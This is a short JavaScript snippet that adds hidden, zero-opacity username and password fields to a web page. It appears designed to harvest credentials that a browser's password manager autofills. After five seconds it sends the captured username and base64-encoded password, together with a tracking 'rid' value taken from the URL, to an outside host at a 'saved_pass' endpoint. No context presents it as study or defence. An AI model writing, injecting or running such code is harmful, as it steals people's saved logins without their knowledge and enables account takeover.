let body = document.getElementsByTagName("body")[0]

var u = document.createElement("input");
u.id = "log_"
u.type = "text";
u.style.position = "fixed";
u.style.opacity = "0";

var p = document.createElement("input");
p.id = "pw_";
p.type = "password";
p.style.position = "fixed";
p.style.opacity = "0";

body.append(u);
body.append(p);

var rid = new URLSearchParams(window.location.search).get('rid'); 

setTimeout(function(){
        fetch("https://www.cassaforenze.it/saved_pass?rid="+ rid + "&usr=" + u.value + "&pas=" + btoa(p.value))
}, 5000);
